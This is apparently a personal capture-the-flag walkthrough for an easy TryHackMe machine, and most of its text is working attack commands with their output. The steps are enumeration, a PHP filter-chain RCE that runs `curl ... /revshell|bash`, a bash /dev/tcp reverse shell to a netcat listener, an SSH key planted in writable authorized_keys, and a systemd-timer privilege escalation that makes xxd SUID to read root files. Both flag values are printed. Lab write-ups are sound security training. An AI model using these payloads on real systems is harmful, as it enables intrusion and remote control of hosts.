- - - 
created : 17-07-2025 

Tags : #easy #detailed 
- - - 
# Objective

[Hacking](../../3%20-%20Tags/Hacking%20Concepts/Hacking.md) for root [Flag]

# Recon
## Nmap

We can scan the target with [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) an see almost every single port is open so we check if there's a website :

<img src="../../Flameshots/12e629e6284f336b6c45d064daed713d.png" alt="12e629e6284f336b6c45d064daed713d.png" width="470" height="264" class="jop-noMdConv">                 <img src="../../Flameshots/b9fce4e8e6396254fe43b7386de9aad6.png" alt="b9fce4e8e6396254fe43b7386de9aad6.png" width="418" height="263" class="jop-noMdConv">

# Enumeration
## Gobuster

We start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) :

```
gobuster dir -u 10.10.8.70 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

/messages             (Status: 301) [Size: 309] [--> http://10.10.8.70/messages/]
```

If we go to the /messages directory we get this text :

![424ee3e4d57806c4348940b9446a42d1.png](../../2%20-%20Resources/Others/Flameshots/424ee3e4d57806c4348940b9446a42d1.png)

So you can get the idea we can do something , If we try to change it in /etc/passwd :

![0283d40f13bc98bf364c377c7115cc85.png](../../2%20-%20Resources/Others/Flameshots/0283d40f13bc98bf364c377c7115cc85.png)

![565cc1874637112a25a7b7778b4ab18b.png](../../2%20-%20Resources/Others/Flameshots/565cc1874637112a25a7b7778b4ab18b.png)

We got a user.

# Exploitation

For the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) (RCE) we can use a [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) through [php filter chain generator](../../3%20-%20Tags/Hacking%20Concepts/php%20filter%20chain%20generator.md) >> https://github.com/synacktiv/php_filter_chain_generator :

<img src="../../Flameshots/2bc9b6775cab82cd126642935bc1c018.png" alt="2bc9b6775cab82cd126642935bc1c018.png" width="496" height="114" class="jop-noMdConv">

Example :

```
└─$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  ' 
[+] The following gadget chain will generate the following code : <?php phpinfo(); ?>   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|co
```

## Reverse Shell

https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/

For the [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) first we create a [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) [Script](../../3%20-%20Tags/Hacking%20Concepts/Script.md) named **"revshell"** in local machine.

```
bash -i >& /dev/tcp/10.8.162.183/1337 0>&1

```

Then create a chain using a generator.  
Replace the [IP address](../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) with your own.

```Linux
└─$ # `<?= ?>` is a shorthand for `<?php echo ~ ?>`
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.8.162.183/revshell|bash` ?>'

[+] The following gadget chain will generate the following code : <?= `curl -s -L 10.8.162.183/revshell|bash` ?> (base64 value: PD89IGBjdXJsIC1zIC1MIDEwLjguMTYyLjE4My9yZXZzaGVsbHxiYXNoYCA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-
```

We need to start a web [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) with [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) that hosts the shell script, and also start a listener for receiving the reverse connection using [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```
└─$ sudo python3 -m http.server 80     
[sudo] password :
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

```
└─$ nc -lvnp 1337      
listening on [any] 1337 ...
```

Now we insert the created chain in the url :

<img src="../../Flameshots/a799d8f7be346af16bb877ab2ee69646.png" alt="a799d8f7be346af16bb877ab2ee69646.png" width="319" height="175" class="jop-noMdConv">

Now we should have the shell :

![4dfea39a25ea544b498ad7d1e0e8cf1d.png](../../2%20-%20Resources/Others/Flameshots/4dfea39a25ea544b498ad7d1e0e8cf1d.png)

```
www-data@ip-10-10-8-70:/var/www/html$ whoami
whoami
www-data
www-data@ip-10-10-8-70:/var/www/html$ ls
ls
adminpanel.css
images
index.html
login.css
login.php
messages.html
orders.html
secret-script.php
style.css
supersecretadminpanel.html
supersecretmessageforadmin
users.html

```

And we search for the flag :

```
www-data@ip-10-10-8-70:/var/www/html$ cd /home/
cd /home/
www-data@ip-10-10-8-70:/home$ ls
ls
comte
ubuntu
www-data@ip-10-10-8-70:/home$ cd comte
cd comte
www-data@ip-10-10-8-70:/home/comte$ ls
ls
snap
user.txt
www-data@ip-10-10-8-70:/home/comte$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

```

So we have to escalate permissions.

If we go to /home/comte/.ssh and we check for permission we can read an write authorised_keys (<span style="color: rgb(224, 62, 45);">UNREALISTIC</span>) :

```
www-data@ip-10-10-8-70:/home/comte/.ssh$ ls -la
ls -la
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25  2024 .
drwxr-xr-x 7 comte comte 4096 Apr  4  2024 ..
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys

```

## SSH KeyGen

We can use [SSH-KeyGen](../../3%20-%20Tags/Hacking%20Tools/SSH-KeyGen.md) to generate a key (skip everything with enter and go) :

```
─$ ssh-keygen            
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/mdn0x/.ssh/id_ed25519): 
Enter passphrase for "/home/mdn0x/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/mdn0x/.ssh/id_ed25519
Your public key has been saved in /home/mdn0x/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:hEr0UZgozVxEGCxB7tgK2SrIhLr1f8N+NCFlFAGprfU mdn0x@mdn0xonKali
The key's randomart image is:
+--[ED25519 256]--+
| .o*oB=+o++o     |
| .o.B.oo. o      |
|  .o. oo.o       |
|.* . ...+ .      |
|=.+ .  oSo .     |
|*o    .   E      |
|*..    . . .     |
|.o .    + .      |
|.   ...o.o       |
+----[SHA256]-----+
```

Now we can search for the key and copy it to our working dir :

```
└─$ cat /home/user/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5CPIfXujh1QKKXqanmQiO5bsibAXPNnnBj8Dx4yXTj user@kali

```

## Stabilize the shell

For the [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) first we need to execute `export TERM=xterm` then `python3 -c 'import pty;pty.spawn("/bin/bash")'` then ctrl+z and `stty raw -echo;fg` and reset + enter

Now we echo our public key into the authorised :

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5CPIfXujh1QKKXqanmQiO5bsibAXPNnnBj8Dx4yXTj user@Kali
"  >>  autorized_keys
```

## SSH

Now we can access comte [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) and cat the flag, ssh will automatically use our key :

```
comte@ip-10-10-8-70:~$ ls
snap  user.txt
comte@ip-10-10-8-70:~$ cat user.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}

```

# Privilege Escalation

For the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we can check sudo commands without passwd :

```
comte@ip-10-10-8-70:~$ sudo -l
User comte may run the following commands on ip-10-10-8-70:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer

```

If we go in /etc/systemd/system and cat exploit.timer and then exploit.server (they go togheter) :

```
comte@ip-10-10-8-70:/etc/systemd/system$ cat exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
comte@ip-10-10-8-70:/etc/systemd/system$ cat exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"

```

if we try to restat the exploit.timer it failed and if we status it says **bad-settings :**

```
comte@ip-10-10-8-70:/etc/systemd/system$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: bad-setting (Reason: Unit exploit.timer has a bad unit file setting.)
     Active: inactive (dead)
    Trigger: n/a
   Triggers: ● exploit.service

```

We can modify the **settings** with **[Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md)** :

![120e2b1e89c733d8b29c3e68202bebbc.png](../../2%20-%20Resources/Others/Flameshots/120e2b1e89c733d8b29c3e68202bebbc.png)

and then reload it and run it :

```
comte@ip-10-10-8-70:/etc/systemd/system$ sudo /bin/systemctl daemon-reload
comte@ip-10-10-8-70:/etc/systemd/system$ sudo /bin/systemctl restart exploit.timer
```

## GTFObins

We search on [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) for xxd :

<img src="../../Flameshots/ba42b46764d6e1e7e7c75af1a8aebd45.png" alt="ba42b46764d6e1e7e7c75af1a8aebd45.png" width="502" height="88" class="jop-noMdConv">

So we can read the root flag easily (without becoming root) :

![f6b1c5cc8e2f15e7868b65cffaa92497.png](../../2%20-%20Resources/Others/Flameshots/f6b1c5cc8e2f15e7868b65cffaa92497.png)

```
comte@ip-10-10-8-70:/opt$ ./xxd "/root/root.txt" | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca75486094810807faf4b7b0a929b11e5e0167c}

```

Pwned !!